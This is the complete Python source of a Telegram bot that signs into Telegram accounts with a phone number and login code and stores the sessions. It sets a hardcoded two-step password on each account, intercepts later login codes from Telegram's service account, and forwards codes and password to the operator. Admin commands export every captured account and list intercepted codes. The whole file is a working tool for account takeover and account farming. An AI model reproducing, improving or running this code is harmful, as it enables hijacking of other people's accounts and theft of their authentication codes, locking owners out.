import os
import json
import re
from datetime import datetime
from dotenv import load_dotenv

from telethon import TelegramClient, events
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, FloodWaitError

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, MessageHandler, CallbackQueryHandler,
    filters, ContextTypes, ConversationHandler
)

load_dotenv()

# ====================== CONFIG ======================
API_ID = int(os.getenv("API_ID"))
API_HASH = os.getenv("API_HASH")
BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_IDS = [int(x.strip()) for x in os.getenv("ADMIN_IDS", "0").split(",") if x.strip()]

TWO_FA_PASSWORD = "Tg@123456"

# ====================== PATHS ======================
SESSIONS_DIR = "sessions"
DATA_DIR = "data"
os.makedirs(SESSIONS_DIR, exist_ok=True)
os.makedirs(DATA_DIR, exist_ok=True)

ACCOUNTS_FILE = f"{DATA_DIR}/accounts.json"
CODES_FILE = f"{DATA_DIR}/codes.json"
ADMINS_FILE = f"{DATA_DIR}/admins.json"

# ====================== STATES ======================
WAITING_CODE = 1

# ====================== GLOBAL ======================
clients = {}
pending = {}

# ====================== HELPERS ======================
def load_json(path, default=None):
    if default is None:
        default = {}
    try:
        if os.path.exists(path):
            with open(path, "r", encoding="utf-8") as f:
                return json.load(f)
    except:
        pass
    return default

def save_json(path, data):
    with open(path, "w", encoding="utf-8") as f:
        json.dump(data, f, ensure_ascii=False, indent=2)

def get_admins():
    admins = load_json(ADMINS_FILE, [])
    if not admins:
        admins = ADMIN_IDS[:]
        save_json(ADMINS_FILE, admins)
    return admins

def is_admin(uid):
    return uid in get_admins()

def get_flag(phone):
    flags = {
        "880": "🇧🇩", "91": "🇮🇳", "92": "🇵🇰", "1": "🇺🇸", "44": "🇬🇧",
        "27": "🇿🇦", "234": "🇳🇬", "966": "🇸🇦", "971": "🇦🇪", "90": "🇹🇷",
        "7": "🇷🇺", "49": "🇩🇪", "33": "🇫🇷", "86": "🇨🇳", "62": "🇮🇩",
        "60": "🇲🇾", "65": "🇸🇬", "63": "🇵🇭", "55": "🇧🇷", "52": "🇲🇽",
        "20": "🇪🇬", "212": "🇲🇦", "40": "🇷🇴", "48": "🇵🇱", "216": "🇹🇳"
    }
    p = str(phone).replace("+", "")
    for code in sorted(flags.keys(), key=len, reverse=True):
        if p.startswith(code):
            return flags[code]
    return "🏳️"

def get_country_code(phone):
    p = str(phone).replace("+", "")
    codes = ["880", "966", "971", "234", "212", "216", "91", "92", "90", "86", "84", "82", "81",
             "66", "65", "63", "62", "60", "55", "52", "49", "48", "44", "40", "39", "33", "27", "20", "7", "1"]
    for code in codes:
        if p.startswith(code):
            return code
    return p[:2]

def get_country_name(code):
    names = {
        "880": "Bangladesh", "91": "India", "92": "Pakistan", "1": "United States",
        "44": "United Kingdom", "27": "South Africa", "234": "Nigeria",
        "966": "Saudi Arabia", "971": "UAE", "90": "Turkey", "7": "Russia",
        "49": "Germany", "33": "France", "86": "China", "62": "Indonesia",
        "60": "Malaysia", "65": "Singapore", "63": "Philippines", "55": "Brazil",
        "52": "Mexico", "20": "Egypt", "212": "Morocco", "40": "Romania", "48": "Poland"
    }
    return names.get(str(code), f"Country +{code}")

# ====================== TELETHON ======================
async def start_client(phone):
    path = f"{SESSIONS_DIR}/{phone.replace('+', '')}"
    client = TelegramClient(path, API_ID, API_HASH)

    @client.on(events.NewMessage(from_users=777000))
    async def handler(e):
        m = re.search(r'(\d{5,6})', e.message.message or "")
        if m:
            codes = load_json(CODES_FILE, {})
            if phone not in codes:
                codes[phone] = []
            codes[phone].insert(0, {
                "code": m.group(1),
                "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            })
            codes[phone] = codes[phone][:15]
            save_json(CODES_FILE, codes)

            # Back mode check
            accounts = load_json(ACCOUNTS_FILE, {})
            acc = accounts.get(phone)
            if acc and acc.get("back_mode"):
                try:
                    from telegram import Bot
                    bot = Bot(token=BOT_TOKEN)
                    flag = get_flag(phone)
                    country = get_country_name(get_country_code(phone))
                    msg = (
                        f"🔐 **New Login Code**\n\n"
                        f"🌍 {flag} {country}\n"
                        f"📱 `{phone}`\n"
                        f"🔑 Code: `{m.group(1)}`\n"
                        f"🔒 2FA: `{TWO_FA_PASSWORD}`\n"
                        f"📅 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
                    )
                    await bot.send_message(chat_id=acc["uid"], text=msg, parse_mode="Markdown")
                except Exception as ex:
                    print("Back mode send error:", ex)

    await client.connect()
    if await client.is_user_authorized():
        clients[phone] = client
        return True
    await client.disconnect()
    return False

async def enable_2fa(client):
    try:
        await client.edit_2fa(new_password=TWO_FA_PASSWORD)
        return True
    except:
        return False

# ====================== USER COMMANDS ======================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    text = (
        f"👋 Welcome **{user.first_name}**!\n\n"
        f"Send phone number with `+`\n"
        f"Example: `+8801712345678`\n\n"
        f"**Commands:**\n"
        f"/mynumber - My numbers by country\n"
        f"/backnumber - Receive codes\n"
        f"/myfile - Download my accounts"
    )
    await update.message.reply_text(text, parse_mode="Markdown")

async def handle_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip().replace(" ", "")
    if not re.match(r'^\+?\d{8,15}$', text):
        return  # সাধারণ টেক্সটে কিছু বলবে না

    phone = text if text.startswith("+") else "+" + text
    chat_id = update.effective_chat.id
    uid = update.effective_user.id

    wait_msg = await update.message.reply_text("⏳ Sending login code...")

    try:
        client = TelegramClient(f"{SESSIONS_DIR}/{phone[1:]}", API_ID, API_HASH)
        await client.connect()

        if await client.is_user_authorized():
            await wait_msg.edit_text("This number is already logged in!")
            await client.disconnect()
            return ConversationHandler.END

        sent = await client.send_code_request(phone)
        pending[chat_id] = {
            "client": client,
            "phone": phone,
            "hash": sent.phone_code_hash,
            "uid": uid
        }

        flag = get_flag(phone)
        await wait_msg.edit_text(
            f"📲 {flag} `{phone}`\n\n"
            f"Code sent! Reply with the 5 or 6-digit code.\n\n"
            f"➿ /cancel",
            parse_mode="Markdown"
        )
        return WAITING_CODE

    except FloodWaitError as e:
        await wait_msg.edit_text(f"FloodWait! Wait {e.seconds} seconds.")
        return ConversationHandler.END
    except Exception as e:
        await wait_msg.edit_text(f"Error: {e}")
        return ConversationHandler.END

async def handle_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    if chat_id not in pending:
        await update.message.reply_text("Session expired. Please send the number again.")
        return ConversationHandler.END

    data = pending[chat_id]
    code = update.message.text.strip()
    phone = data["phone"]
    uid = data["uid"]

    try:
        await data["client"].sign_in(phone, code, phone_code_hash=data["hash"])
    except SessionPasswordNeededError:
        await update.message.reply_text("This number already has 2FA.")
        await data["client"].disconnect()
        del pending[chat_id]
        return ConversationHandler.END
    except PhoneCodeInvalidError:
        await update.message.reply_text("❗️ Invalid code. Try again.\n\n/cancel")
        return WAITING_CODE
    except Exception as e:
        await update.message.reply_text(f"Error: {e}")
        await data["client"].disconnect()
        del pending[chat_id]
        return ConversationHandler.END

    # Success
    me = await data["client"].get_me()
    ok = await enable_2fa(data["client"])

    accounts = load_json(ACCOUNTS_FILE, {})
    accounts[phone] = {
        "uid": uid,
        "name": me.first_name or "",
        "username": me.username or "",
        "country": get_country_code(phone),
        "2fa": TWO_FA_PASSWORD if ok else "Failed",
        "added": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "back_mode": False
    }
    save_json(ACCOUNTS_FILE, accounts)

    await data["client"].disconnect()
    await start_client(phone)
    del pending[chat_id]

    flag = get_flag(phone)
    country = get_country_name(get_country_code(phone))

    await update.message.reply_text(
        f"✅ **Account Added Successfully!**\n\n"
        f"🌍 {flag} {country}\n"
        f"📱 `{phone}`\n"
        f"👤 {me.first_name or 'N/A'}\n"
        f"🔒 2FA: `{'Enabled' if ok else 'Failed'}`",
        parse_mode="Markdown"
    )
    return ConversationHandler.END

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    if chat_id in pending:
        try:
            await pending[chat_id]["client"].disconnect()
        except:
            pass
        del pending[chat_id]
    await update.message.reply_text("✅ Cancelled.")
    return ConversationHandler.END

# ====================== MYNUMBER & BACKNUMBER ======================
async def mynumber_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    accounts = load_json(ACCOUNTS_FILE, {})
    country_count = {}
    for phone, info in accounts.items():
        if info.get("uid") == uid:
            code = info.get("country") or get_country_code(phone)
            country_count[code] = country_count.get(code, 0) + 1

    if not country_count:
        await update.message.reply_text("You have no numbers yet.")
        return

    kb = []
    for code, count in sorted(country_count.items(), key=lambda x: -x[1]):
        flag = get_flag("+" + code)
        name = get_country_name(code)
        kb.append([InlineKeyboardButton(f"{flag} {name} ({count})", callback_data=f"myc_{code}")])

    await update.message.reply_text(
        "📱 **Your Numbers by Country**",
        reply_markup=InlineKeyboardMarkup(kb),
        parse_mode="Markdown"
    )

async def mycountry_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    uid = q.from_user.id
    code = q.data.replace("myc_", "")
    accounts = load_json(ACCOUNTS_FILE, {})
    numbers = [p for p, i in accounts.items() if i.get("uid") == uid and (i.get("country") == code or get_country_code(p) == code)]

    flag = get_flag("+" + code)
    name = get_country_name(code)
    text = f"{flag} **{name}** — {len(numbers)} numbers\n\n"
    for i, p in enumerate(numbers[:25], 1):
        text += f"{i}. `{p}`\n"
    await q.edit_message_text(text, parse_mode="Markdown")

async def backnumber_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    accounts = load_json(ACCOUNTS_FILE, {})
    country_count = {}
    for phone, info in accounts.items():
        if info.get("uid") == uid:
            code = info.get("country") or get_country_code(phone)
            country_count[code] = country_count.get(code, 0) + 1

    if not country_count:
        await update.message.reply_text("You have no numbers yet.")
        return

    kb = []
    for code, count in sorted(country_count.items(), key=lambda x: -x[1]):
        flag = get_flag("+" + code)
        name = get_country_name(code)
        kb.append([InlineKeyboardButton(f"{flag} {name} ({count})", callback_data=f"back_{code}")])

    await update.message.reply_text(
        "🔙 Select country to receive login codes:",
        reply_markup=InlineKeyboardMarkup(kb)
    )

async def back_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    uid = q.from_user.id
    code = q.data.replace("back_", "")
    accounts = load_json(ACCOUNTS_FILE, {})
    count = 0
    for phone, info in accounts.items():
        if info.get("uid") == uid and (info.get("country") == code or get_country_code(phone) == code):
            info["back_mode"] = True
            accounts[phone] = info
            count += 1
    save_json(ACCOUNTS_FILE, accounts)
    flag = get_flag("+" + code)
    name = get_country_name(code)
    await q.edit_message_text(f"✅ Back mode ON for {flag} {name}\nNumbers: `{count}`", parse_mode="Markdown")

async def myfile_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    accounts = load_json(ACCOUNTS_FILE, {})
    user_accs = {p: i for p, i in accounts.items() if i.get("uid") == uid}
    if not user_accs:
        await update.message.reply_text("No accounts to download.")
        return
    path = f"{DATA_DIR}/my_{uid}.json"
    save_json(path, user_accs)
    await update.message.reply_document(open(path, "rb"), filename=f"my_accounts.json", caption=f"Total: {len(user_accs)}")

# ====================== DASHBOARD ======================
async def dashboard(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return

    accounts = load_json(ACCOUNTS_FILE, {})
    total_users = len(set(i.get("uid") for i in accounts.values() if i.get("uid")))
    total_numbers = len(accounts)

    country_stats = {}
    for phone, info in accounts.items():
        code = info.get("country") or get_country_code(phone)
        country_stats[code] = country_stats.get(code, 0) + 1

    text = (
        f"👨‍💻 **Admin Dashboard**\n\n"
        f"👥 Total Users: `{total_users}`\n"
        f"🔢 Total Numbers: `{total_numbers}`\n"
        f"🟢 Online Clients: `{len(clients)}`\n\n"
        f"**Top Countries:**\n"
    )
    for code, cnt in sorted(country_stats.items(), key=lambda x: -x[1])[:8]:
        text += f"{get_flag('+' + code)} {get_country_name(code)}: `{cnt}`\n"

    kb = [
        [InlineKeyboardButton("📁 All Accounts", callback_data="adm_allfile")],
        [InlineKeyboardButton("📄 User File", callback_data="adm_userfile")],
        [InlineKeyboardButton("🔐 View Codes", callback_data="adm_codes")],
        [InlineKeyboardButton("📢 BoardChat", callback_data="adm_broadcast")],
        [InlineKeyboardButton("🔄 Reload", callback_data="adm_reload")]
    ]
    await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")

async def admin_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    if not is_admin(q.from_user.id):
        return

    data = q.data

    if data == "adm_allfile":
        accounts = load_json(ACCOUNTS_FILE, {})
        path = f"{DATA_DIR}/all_accounts.json"
        save_json(path, accounts)
        await q.message.reply_document(open(path, "rb"), filename="all_accounts.json")

    elif data == "adm_userfile":
        context.user_data["action"] = "userfile"
        await q.edit_message_text("Send User ID:")

    elif data == "adm_codes":
        context.user_data["action"] = "codes"
        await q.edit_message_text("Send phone number:\nExample: `+8801712345678`")

    elif data == "adm_broadcast":
        context.user_data["action"] = "broadcast"
        await q.edit_message_text("Send the message to broadcast to all users:")

    elif data == "adm_reload":
        accounts = load_json(ACCOUNTS_FILE, {})
        loaded = 0
        for phone in accounts:
            try:
                if await start_client(phone):
                    loaded += 1
            except:
                pass
        await q.edit_message_text(f"✅ Reloaded {loaded} clients")

async def admin_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return
    if "action" not in context.user_data:
        return

    action = context.user_data.pop("action")
    text = update.message.text.strip()

    if action == "userfile":
        try:
            uid = int(text)
        except:
            await update.message.reply_text("Invalid ID")
            return
        accounts = load_json(ACCOUNTS_FILE, {})
        user_accs = {p: i for p, i in accounts.items() if i.get("uid") == uid}
        if not user_accs:
            await update.message.reply_text("No accounts found.")
            return
        path = f"{DATA_DIR}/u_{uid}.json"
        save_json(path, user_accs)
        await update.message.reply_document(open(path, "rb"), filename=f"user_{uid}.json")

    elif action == "codes":
        phone = text if text.startswith("+") else "+" + text
        codes = load_json(CODES_FILE, {})
        if phone not in codes:
            await update.message.reply_text("No codes found.")
            return
        msg = f"🔐 Codes for `{phone}`\n\n"
        for c in codes[phone][:10]:
            msg += f"`{c['code']}` — {c['time']}\n"
        await update.message.reply_text(msg, parse_mode="Markdown")

    elif action == "broadcast":
        accounts = load_json(ACCOUNTS_FILE, {})
        users = list(set(i.get("uid") for i in accounts.values() if i.get("uid")))
        ok = fail = 0
        status = await update.message.reply_text(f"Sending to {len(users)} users...")
        for uid in users:
            try:
                await context.bot.send_message(uid, f"📢 **Announcement**\n\n{text}", parse_mode="Markdown")
                ok += 1
            except:
                fail += 1
        await status.edit_text(f"✅ Done\nSuccess: {ok}\nFailed: {fail}")

# ====================== MAIN ======================
async def post_init(app):
    print("Loading sessions...")
    accounts = load_json(ACCOUNTS_FILE, {})
    for phone in accounts:
        try:
            await start_client(phone)
        except:
            pass
    print("Bot Ready!")

def main():
    app = Application.builder().token(BOT_TOKEN).post_init(post_init).build()

    # Login Conversation
    login_conv = ConversationHandler(
        entry_points=[
            MessageHandler(filters.TEXT & ~filters.COMMAND, handle_phone)
        ],
        states={
            WAITING_CODE: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_code)
            ]
        },
        fallbacks=[
            CommandHandler("cancel", cancel)
        ],
        allow_reentry=True
    )

    # Commands
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("mynumber", mynumber_cmd))
    app.add_handler(CommandHandler("backnumber", backnumber_cmd))
    app.add_handler(CommandHandler("myfile", myfile_cmd))
    app.add_handler(CommandHandler("dashboard", dashboard))
    app.add_handler(CommandHandler("cancel", cancel))

    # Login Conversation
    app.add_handler(login_conv)

    # Callback Queries
    app.add_handler(
        CallbackQueryHandler(mycountry_cb, pattern=r"^myc_")
    )
    app.add_handler(
        CallbackQueryHandler(back_cb, pattern=r"^back_")
    )
    app.add_handler(
        CallbackQueryHandler(admin_cb)
    )

    # Admin Text Handler
    # ConversationHandler-এর পরে রাখা হয়েছে
    app.add_handler(
        MessageHandler(filters.TEXT & ~filters.COMMAND, admin_text)
    )

    print("Bot starting...")
    app.run_polling()


if __name__ == "__main__":
    main()
